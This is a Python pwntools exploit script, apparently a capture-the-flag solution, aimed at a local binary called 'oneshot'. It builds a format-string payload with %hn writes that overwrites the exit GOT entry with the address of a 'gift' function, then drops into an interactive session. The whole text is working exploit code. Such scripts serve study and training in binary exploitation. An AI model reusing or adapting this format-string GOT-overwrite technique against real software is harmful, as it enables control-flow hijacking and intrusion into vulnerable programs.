from pwn import *

# context.log_level = 'debug'

e = ELF("./oneshot")
p = process(e.path)

exit_got = e.got['exit']
gift = e.symbols['gift']

gift_h = gift >> 16
gift_l = gift & 0xffff

p.recvuntil(b"\n\n")
payload = f'%{gift_h}c'.encode()
payload += b"%10$hn"
payload += f"%{gift_l - gift_h}c".encode()
payload += b"%11$hn"
payload = payload.ljust(0x20, b"\x00")
payload += p64(e.got["exit"] + 2)
payload += p64(e.got["exit"])
p.send(payload)

p.interactive()